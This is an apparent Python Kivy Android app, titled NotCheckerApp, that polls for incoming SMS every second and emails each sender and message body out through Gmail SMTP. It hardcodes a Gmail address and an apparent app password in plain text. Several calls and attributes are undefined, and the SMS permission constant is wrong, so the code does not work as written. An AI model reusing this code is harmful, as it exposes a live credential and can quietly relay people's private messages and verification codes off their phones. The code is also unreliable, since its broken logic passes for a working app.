import kivy
import smtplib
from kivy.app import App
from kivy.clock import Clock
from kivy.storage.jsonstore import JsonStore
from kivy.uix.boxlayout import BoxLayout
from email.message import EmailMessage

from android.content.pm import PackageManager


kivy.require('2.2.1')

gmail_user = 'alexkorobov95@gmail.com'
gmail_password = 'sbno rjmb baxr'


class MyRoot(BoxLayout):
    def __init__(self):
        super(MyRoot, self).__init__()

        # Инициализировать переменные
        self.sms_api = None
        self.last_sms_date = 0

        # Запросить разрешения на доступ к SMS
        self.request_sms_permissions()

    def start_program(self):
        self.label_text.text = "Program is started"
        # Запустить получение данных SMS
        Clock.schedule_interval(lambda dt: self.handle_new_sms(), 1)

    def handle_new_sms(self):
        # Получить новые SMS сообщения
        new_sms = get_new_sms()

        # Проверить, есть ли новые сообщения
        if new_sms:
            # Отправить уведомления по электронной почте
            for sms in new_sms:
                sender_number = sms.address
                message_content = sms.body
                email_content = (f"New SMS received from {sender_number}:\n\n{message_content}")
                self.send_saved_sms(email_content)

    def send_saved_sms(self, message):
        sent_from = gmail_user
        to = 'your_email_address'
        body = message
        subject = 'SMS Phone notification'

        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            server.login(sent_from, gmail_password)
            msg = EmailMessage()
            msg['Subject'] = subject
            msg['From'] = sent_from
            msg['To'] = to
            msg.set_content(body)
            server.send_message(msg)
            server.close()
            print('Email sent!')
        except Exception as e:
            print(f'Something went wrong: {e}')

    def request_sms_permissions(self):
        # Запросить разрешения на доступ к SMS
        from android.permission import ACCESS_SMS
        from android.content.pm import PackageManager
        permission_status = self.pm.checkPermission(ACCESS_SMS, self.packageName)
        if permission_status == PackageManager.PERMISSION_DENIED:
            # Запросить разрешение
            self.request_permissions([ACCESS_SMS])


class NotCheckerApp(App):

    def build(self):
        return MyRoot()


if __name__ == '__main__':
    notCheckerApp = NotCheckerApp()
    notCheckerApp.run()

